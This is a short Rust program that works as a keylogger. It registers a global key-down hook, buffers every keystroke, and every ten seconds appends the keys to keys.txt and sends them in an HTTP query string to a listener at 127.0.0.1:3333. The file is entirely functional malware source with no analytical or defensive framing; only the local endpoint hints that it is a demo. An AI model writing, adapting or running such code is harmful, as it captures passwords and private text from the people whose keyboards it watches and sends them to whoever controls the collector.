use device_query::{DeviceEvents, DeviceQuery, DeviceState, Keycode};
use std::fs::OpenOptions;
use std::io::prelude::*;
use std::sync::Arc;
use std::sync::Mutex;
use std::thread::sleep;
use std::time::Duration;
// use std::Arc;
fn main() {
    let device_state = DeviceState::new();

    let key_vec : Vec<String> = Vec::new();
    let wrapped_vec = Arc::new(Mutex::new(key_vec));
    let cloned_vec = wrapped_vec.clone();

    let _guard = device_state.on_key_down(move|key| -> (){
        let k = match key {
            Keycode::Space => " ".to_owned(),
            Keycode::Enter => "\n".to_owned(),
            _ => key.to_string(),
        };
        let mut unwrapped = cloned_vec.lock().expect("msg");
        unwrapped.push(k);
    });
    loop {
        sleep(Duration::from_millis(10000));
        // print!("{}", Arc::strong_count(&wrapped_vec));
        let mut unwrapped_vec = wrapped_vec.lock().expect("msg");
        if unwrapped_vec.len() > 0 {
            export_data(&unwrapped_vec);
            unwrapped_vec.clear();
        }
    }
}

fn export_data(data : &Vec<String>) -> () {
    let mut file = OpenOptions::new()
        .read(true)
        .append(true)
        .create(true)
        .open("keys.txt")
        .expect("");
    let mut s = String::new();
    for c in data.iter(){
        file.write_all(c.as_bytes()).expect("Cannot write file");
        s.push_str(c);
    }
    let _ = ureq::get(&("http://127.0.0.1:3333?b=".to_owned() + &s))
        .set("Example-Header", "header value")
        .call();
}